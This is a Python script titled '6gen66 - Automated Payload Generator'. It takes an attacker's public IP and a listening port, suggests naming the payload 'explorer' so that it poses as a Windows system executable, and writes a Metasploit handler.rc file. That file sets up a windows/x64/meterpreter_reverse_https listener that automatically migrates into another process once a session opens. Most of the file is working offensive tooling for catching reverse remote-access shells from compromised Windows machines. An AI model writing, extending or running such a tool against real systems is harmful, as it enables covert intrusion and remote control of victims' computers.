import argparse
import os
import subprocess
import urllib.request

def parse_args():
    parser = argparse.ArgumentParser(description="6gen66 - Automated Payload Generator")
    parser.add_argument(
        "-p",
        "--payload",
        type=str,
        help="Define your payload's name.(e.g explorer)The program will automatically append .exe to your file.",
    )

    return parser.parse_args()

ascii_art = r"""
  ad8888ba,                                      ad8888ba,   ad8888ba, 
 8P'    "Y8                                     8P'    "Y8  8P'    "Y8 
d8                                             d8          d8          
88                                             88          88          
88,dd888bb,                                    88,dd888bb, 88,dd888bb, 
88P'    `8b    ,gggg,gg   ,ggg,    ,ggg,,ggg,  88P'    `8b 88P'    `8b 
88       88   dP"  "Y8I  i8" "8i  ,8" "8P" "8, 88       88 88       88 
88       88  i8'    ,8I  I8, ,8I  I8   8I   8I 88       88 88       88 
88a     a8P ,d8,   ,d8I  `YbadP' ,dP   8I   Yb,88a     a8P 88a     a8P 
 "Y88888P"  P"Y8888P"888888P"Y8888P'   8I   `Y8 "Y88888P"   "Y88888P"  
                   ,d8I'                                               
                 ,dP'8I                                                
                ,8"  8I                                                
                I8   8I                                                
                `8, ,8I                                                
                 `Y8P"                                                 
"""
def detect_ip():
    try:
        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
            return response.read().decode('utf-8').strip()

    except Exception:
        return ("N/A")


def get_user_ip():
    print(ascii_art)
    payload = parse_args()
    current_ip = detect_ip()
    print(f"Your public IP is: {current_ip}")
    while True:
        public_ip_question = input("Do you want to use it ? (Yes/No) ").strip().lower()
        if public_ip_question in ["y","Yes","yes"]:
            print(f"Chosen IP: {current_ip}")
            return current_ip
        elif public_ip_question in ["n","No","n"]:
            user_given_ip = input("Your IP : ").strip()
            print(f"Chosen IP: {user_given_ip}")
            return user_given_ip
        else:
             print("Please specify only yes or no.")


def get_user_target(lhost):
    while True:
        host_port = input("Enter your LPORT: ").strip()
        if host_port.isdigit():
            break
        print("You must specify your LPORT as numbers.")
    payload_name = input("Enter your payload name(For example: explorer):\n")
    print(f"Setting LHOST to {lhost}")
    print(f"Setting LPORT to {host_port}")
    print(f"Setting payload name to: {payload_name}.exe")
    return host_port , payload_name

def metasploit_handler(lhost,lport):
    print("Creating a handler file for Metasploit...")
    metasploit_content = f"""
    use exploit/multi/handler
    set PAYLOAD windows/x64/meterpreter_reverse_https
    set LHOST {lhost}
    set LPORT {lport}
    set ExitOnSession false
    SessionCommunicationTimeout 0
    set AutoRunScript post/windows/manage/migrate
    exploit -j -z
    """
    with open("handler.rc","w") as f:
        f.write(metasploit_content)
    print("Successfully created a handler.rc file!")



lhost = get_user_ip()
lport, payload_name = get_user_target(lhost)
metasploit_handler(lhost, lport)

